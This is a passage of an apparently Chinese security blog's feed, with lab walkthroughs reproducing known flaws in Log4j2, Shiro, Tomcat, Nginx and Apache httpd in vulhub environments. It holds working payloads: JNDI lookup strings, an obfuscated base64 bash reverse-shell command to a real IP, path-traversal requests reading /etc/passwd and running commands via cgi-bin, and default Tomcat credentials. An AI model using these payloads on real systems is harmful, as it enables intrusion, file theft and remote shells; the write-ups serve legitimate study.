href="#Log4j2-JNDI-注入" class="headerlink" title="Log4j2 JNDI 注入"></a>Log4j2 JNDI 注入</h2><h3 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>Apache Log4j 2 是 Java 语言的日志处理套件，使用极为广泛。在其 2.0 到 2.14.1 版本中存在一处 JNDI 注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的 lookup 用于进行JNDI注入，执行任意代码。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Log4j2 提供了一个 <code>Lookup</code> 的功能，在遇到如 <code>$&#123;key:value&#125;</code> 这种形式时，不会直接原样输出，而是去调用这个 <code>key</code> 对应的解释器，然后 <code>value</code> 作为该解释器的参数。</p><p>那么当 <code>key</code> 为 <code>jndi</code> 时，它就会调用这个 <code>JNDILookup</code> ，这个解释器的底层是使用 <code>JNDI</code> 原生 <code>Lookup</code> 实现的，用户可控的 <code>value</code> 作为 <code>JNDI</code> 中 <code>Lookup</code> 的参数，导致 <code>JNDI</code> 漏洞的产生。</p><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul><li><a href="https://vulhub.org/#/environments/log4j/CVE-2021-44228/">https://vulhub.org/#/environments/log4j/CVE-2021-44228/</a></li></ul><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞位置：<code>http://your_ip:8983/solr/admin/cores?action=</code></p><h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">$&#123;jndi:ldap://$&#123;<span class="hljs-keyword">sy</span><span class="hljs-variable">s:java</span>.<span class="hljs-keyword">version</span>&#125;.xxx.dnslog.<span class="hljs-keyword">cn</span>&#125;<br>$&#123;jndi:rmi://$&#123;<span class="hljs-keyword">sy</span><span class="hljs-variable">s:java</span>.<span class="hljs-keyword">version</span>&#125;.xxx.dnslog.<span class="hljs-keyword">cn</span>&#125;<br>$&#123;jndi:ldap://sb6vjj.dnslog.<span class="hljs-keyword">cn</span>/<span class="hljs-built_in">exp</span>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.323tu7.dnslog.cn&#125;</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>43.139.185.135:8983<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021647202.png" alt="image-20230902164738050"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021647640.png" alt="image-20230902164718513"></p><h4 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h4><p>项目地址：<a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar JNDI-Injection-Exploit-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar -C <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzkuMTg1LjEzNS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="hljs-string">&quot;43.139.185.135&quot;</span><br></code></pre></td></tr></table></figure><p>启动后会生成 Payload，使用对应 jdk 版本的 payload 即可：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021645819.png" alt="image-20230902164559760"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021646802.png" alt="image-20230902164615651"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021643247.png" alt="image-20230902164357202"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro漏洞复现</title>
    <link href="/2023/05/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/05/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Shiro漏洞复现"><a href="#Shiro漏洞复现" class="headerlink" title="Shiro漏洞复现"></a>Shiro漏洞复现</h1><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>框架特征：</p><ul><li>登录页面有 “记住我”</li><li>Cookie 中有 rememberme 字段</li></ul><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309012324362.png" alt="Shiro"></p><h2 id="Shiro550反序列化漏洞"><a href="#Shiro550反序列化漏洞" class="headerlink" title="Shiro550反序列化漏洞"></a>Shiro550反序列化漏洞</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>Apache Shiro 1.2.4 及以前版本中，加密的用户信息序列化后存储在名为 remember-me 的 Cookie 中。攻击者可以使用Shiro 的默认密钥伪造用户 Cookie，触发 Java 反序列化漏洞，进而在目标机器上执行任意命令。</p><p>有些开发者会修改默认密钥，不过网上有收集泄露的密钥，可以进行密钥爆破。</p><p>漏洞原理：<a href="https://fuyoumingyan.github.io/2023/08/31/Java%E5%AE%89%E5%85%A8/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Shiro反序列化</a></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul><li><a href="https://vulhub.org/#/environments/shiro/CVE-2016-4437/">https://vulhub.org/#/environments/shiro/CVE-2016-4437/</a></li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>项目地址：<a href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309012155655.png" alt="image-20230901215515560"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309012156300.png" alt="image-20230901215622217"></p><h2 id="Shiro认证绕过漏洞"><a href="#Shiro认证绕过漏洞" class="headerlink" title="Shiro认证绕过漏洞"></a>Shiro认证绕过漏洞</h2><h3 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>在Apache Shiro 1.5.2以前的版本中，在使用Spring动态控制器时，攻击者通过构造<code>..;</code>这样的跳转，可以绕过Shiro中对目录的权限限制。</p><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul><li><a href="https://vulhub.org/#/environments/shiro/CVE-2020-1957/">https://vulhub.org/#/environments/shiro/CVE-2020-1957/</a></li></ul><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接请求管理页面 <code>/admin/</code>，无法访问，将会被重定向到登录页面：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309012212880.png" alt="image-20230901221244723"></p><p>构造恶意请求 <code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309012213922.png" alt="image-20230901221308764"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tomcat漏洞复现</title>
    <link href="/2023/05/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/05/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Tomcat漏洞复现"><a href="#Tomcat漏洞复现" class="headerlink" title="Tomcat漏洞复现"></a>Tomcat漏洞复现</h1><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/Tomcat.png" alt="Tomcat"></p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>tomcat 8 后台弱口令：<code>tomcat/tomcat</code></p><blockquote><p>conf&#x2F;tomcat-users.xml 用户配置文件</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tomcat-users</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://tomcat.apache.org/xml&quot;</span></span><br><span class="hljs-tag">              <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">              <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span><br><span class="hljs-tag">              <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;manager-gui&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;manager-script&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;manager-jmx&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;manager-status&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;admin-gui&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;admin-script&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;tomcat&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;tomcat&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot;</span> /&gt;</span><br>    <br><span class="hljs-tag">&lt;/<span class="hljs-name">tomcat-users</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="后台GetShell"><a href="#后台GetShell" class="headerlink" title="后台GetShell"></a>后台GetShell</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>Tomcat 支持在后台部署 war 文件，可以直接将 webshell 部署到web目录下。</p><p>war 包制作：将 webshell 压缩为 zip，之后修改 zip 后缀为 war 即可。</p><blockquote><p>注：使用 shell.war 名字上传，有时候无法访问 webshell</p></blockquote><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://vulhub.org/#/environments/tomcat/tomcat8/">https://vulhub.org/#/environments/tomcat/tomcat8/</a></p><p><a href="https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8/README.zh-cn.md</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd vulhub-master//tomcat/tomcat8<br>docker-compose up -d<br></code></pre></td></tr></table></figure><blockquote><p>1.生成一个 jsp 的后门，制作 war 包</p></blockquote><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230501155707248.png" alt="image-20230501155707248"></p><blockquote><p>2.弱口令登录后台，上传 war 包</p></blockquote><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230501155738569.png" alt="image-20230501155738569"></p><blockquote><p>3.上传成功，出现 test 路径</p></blockquote><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230501155806519.png" alt="image-20230501155806519"></p><blockquote><p>4.访问 &#x2F;test&#x2F;shell.jsp 连接后门</p></blockquote><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230501155852866.png" alt="image-20230501155852866"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><blockquote><p>CVE-2020-1938</p></blockquote><p>tomcat默认的conf&#x2F;server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip。</p><p>由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p><blockquote><p>影响版本</p></blockquote><ul><li>Apache Tomcat 6</li><li>Apache Tomcat 7 &lt; 7.0.100</li><li>Apache Tomcat 8 &lt; 8.5.51</li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://vulhub.org/#/environments/tomcat/CVE-2020-1938/">https://vulhub.org/#/environments/tomcat/CVE-2020-1938/</a></p><p><a href="https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2020-1938/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2020-1938/README.zh-cn.md</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd vulhub-master/tomcat/CVE-2020-1938<br>docker-compose up -d<br></code></pre></td></tr></table></figure><p>AJP 开放在 8009 端口。</p><p>可以使用 AJPy 工具进行漏洞利用：<a href="https://github.com/hypn0s/AJPy">https://github.com/hypn0s/AJPy</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/hypn0s/AJPy.git     <br>cd AJPy/<br>python tomcat.py read_file --webapp=examples /WEB-INF/web.xml 43.140.192.244<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230501161724717.png" alt="image-20230501161724717"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nginx漏洞复现</title>
    <link href="/2023/05/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/05/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Nginx漏洞复现"><a href="#Nginx漏洞复现" class="headerlink" title="Nginx漏洞复现"></a>Nginx漏洞复现</h1><h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。但在高版本的php中，由于 security.limit_extensions 的引入，使得该漏洞难以被成功利用。</p><p>对于任意文件名，在后面添加 &#x2F;xxx.php后，即可作为php解析。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/">https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd vulhub-master/nginx/nginx_parsing_vulnerability/<br>docker-compose up -d<br></code></pre></td></tr></table></figure><p><a href="http://your-ip/uploadfiles/nginx.png">http://your-ip/uploadfiles/nginx.png</a> 是图片，在其后门添加 &#x2F;.php 后会被当做 php 解析：<a href="http://your-ip/uploadfiles/nginx.png/.php">http://your-ip/uploadfiles/nginx.png/.php</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230501153012261.png" alt="image-20230501153012261"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache漏洞复现</title>
    <link href="/2023/05/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/05/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Apache-漏洞复现"><a href="#Apache-漏洞复现" class="headerlink" title="Apache 漏洞复现"></a><em>Apache</em> 漏洞复现</h1><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/Apache.png" alt="Apache"></p><h2 id="CVE-2021-41773"><a href="#CVE-2021-41773" class="headerlink" title="CVE-2021-41773"></a>CVE-2021-41773</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>在apache 2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p><ul><li>版本等于2.4.49</li><li>穿越的目录允许被访问，比如配置了<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>。（默认情况下是不允许的）</li></ul><p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://vulhub.org/#/environments/httpd/CVE-2021-41773/">https://vulhub.org/#/environments/httpd/CVE-2021-41773/</a></p><p><a href="https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub-master/httpd/CVE-2021-41773/<br>docker-compose up -d<br></code></pre></td></tr></table></figure><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><blockquote><p>访问 &#x2F;icons&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd 实现文件读取，”.” 需要进行 URL 编码为 “%2e”</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>43.140.192.244:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">If-Modified-Since</span><span class="hljs-punctuation">: </span>Mon, 11 Jun 2007 18:53:14 GMT<br><span class="hljs-attribute">If-None-Match</span><span class="hljs-punctuation">: </span>&quot;2d-432a5e4a73a80&quot;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230501124325145.png" alt="image-20230501124325145"></p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><blockquote><p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -v --data <span class="hljs-string">&quot;echo;id&quot;</span> <span class="hljs-string">&#x27;http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>43.140.192.244:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">If-Modified-Since</span><span class="hljs-punctuation">: </span>Mon, 11 Jun 2007 18:53:14 GMT<br><span class="hljs-attribute">If-None-Match</span><span class="hljs-punctuation">: </span>&quot;2d-432a5e4a73a80&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>7<br><br><span class="language-bash"><span class="hljs-built_in">echo</span>;<span class="hljs-built_in">id</span></span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230501130827440.png" alt="image-20230501130827440"></p><h2 id="CVE-2021-42013"><a href="#CVE-2021-42013" class="headerlink" title="CVE-2021-42013"></a>CVE-2021-42013</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache官方在2.4.50版本中对2.4.49版本中出现的目录穿越漏洞<a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-41773">CVE-2021-41773</a>进行了修复，但这个修复是不完整的，CVE-2021-42013是对补丁的绕过。</p><p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了 cgi 或 cgid的服务器上执行任意命令。</p><p>这个漏洞可以影响 Apache HTTP Server 2.4.49 以及 2.4.50两个版本。</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://vulhub.org/#/environments/httpd/CVE-2021-42013/">https://vulhub.org/#/environments/httpd/CVE-2021-42013/</a></p><p><a href="https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-42013/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-42013/README.zh-cn.md</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub-master/httpd/CVE-2021-42013/<br>docker-compose up -d<br></code></pre></td></tr></table></figure><h4 id="文件读取-1"><a href="#文件读取-1" class="headerlink" title="文件读取"></a>文件读取</h4><blockquote><p>“..” URL 编码为 “.%%32%65” </p></blockquote><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230501125221842.png" alt="image-20230501125221842"></p><h4 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -v --data <span class="hljs-string">&quot;echo;id&quot;</span> <span class="hljs-string">&#x27;http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: 